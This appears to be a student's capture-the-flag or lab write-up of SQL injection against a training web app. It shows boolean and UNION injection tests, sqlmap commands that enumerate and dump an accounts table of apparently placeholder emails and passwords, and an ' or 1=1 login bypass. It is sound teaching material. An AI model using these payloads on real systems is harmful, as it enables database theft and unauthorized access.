# SQL Injection 

> Makayla Ferrell | July 28th, 2021

### Steps 


1. Connect to VPN 
```
sudo openvpn <filename> 
```
2. Visit given target at 10.124.211.96. 

3. Find SQLi vulnerable spots
/newsdetails.php?id=16 
Test for '' gives Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in /var/www/newsdetails.php on line 29 
True Test: id=26 and 1=1; -- - (shows entry)
False Test: id=26 and 1=2; -- - (shows nothing)
Vulnerable to union select, running back-end DBMS MYSQL >= 5.0.12


SQLmap: Payload: id=1 UNION ALL SELECT CONCAT(0x7162786271,0x74514f534f425a59517164454c55447443785776424d59787379674c7a6a514f6b466e426c486e59,0x71766a7a71)-- - 

4. Use sql to find db information 
```
sqlmap -u http://10.124.211.96/newsdetails.php?id=1 --technique=U --users

```
User: 'awd'@'%'
```
sqlmap -u http://10.124.211.96/newsdetails.php?id=1 --technique=U --dbs 
```
[*] awd
[*] information_schema
```
sqlmap -u http://10.124.211.96/newsdetails.php?id=1 --technique=U -D awd --tables
```
[3 tables]
+----------+
| accounts |
| awards   |
| news     |
+----------+
```
sqlmap -u http://10.124.211.96/newsdetails.php?id=1 --technique=U -D awd -T accounts --dump
```

+----+-----------------------------------------------------+-------------+-------------------+
| id | email                                               | password    | displayname       |
+----+-----------------------------------------------------+-------------+-------------------+
| 1  | admin@awdmgmt.labs                                  | S3cr3tBOFH  | Admin             |
| 2  | porta.elit.a@adipiscingMaurismolestie.net           | VUH74DYX6DO | Mallory Reed      |
| 3  | ipsum.leo.elementum@Phasellusfermentumconvallis.org | GUC97VHY8HK | Katell Stewart    |
| 4  | mauris.sit@torquent.edu                             | LPW27DSG6QE | Gemma Beck        |
| 5  | Praesent.interdum@ametrisus.org                     | TWS34ORL6GX | Fuller Casey      |
| 6  | Quisque.libero@Cum.ca                               | OSQ80TYZ6YW | Hu Miles          |
| 7  | tincidunt.Donec.vitae@tempuseuligula.com            | HOV82DUI9TF | Lacey Hawkins     |
| 8  | dignissim.Maecenas@estcongue.org                    | TEO38KNA2UZ | Kaden Singleton   |
| 9  | dictum@tempusrisusDonec.ca                          | LKK51JAO3PJ | Britanney Guzman  |
| 10 | blandit.viverra.Donec@Suspendisse.net               | PTS90MHF9XA | Aspen Byers       |
| 11 | ligula@mollisDuis.ca                                | PLN49WZU6IB | Alexandra Cabrera |
+----+-----------------------------------------------------+-------------+-------------------+

4. Sign in with credential from account table. 
admin@awdmgmt.labs:S3cr3tBOFH 

5. Login without credentials 
Use ' or 1=1; -- - in Email block to login 

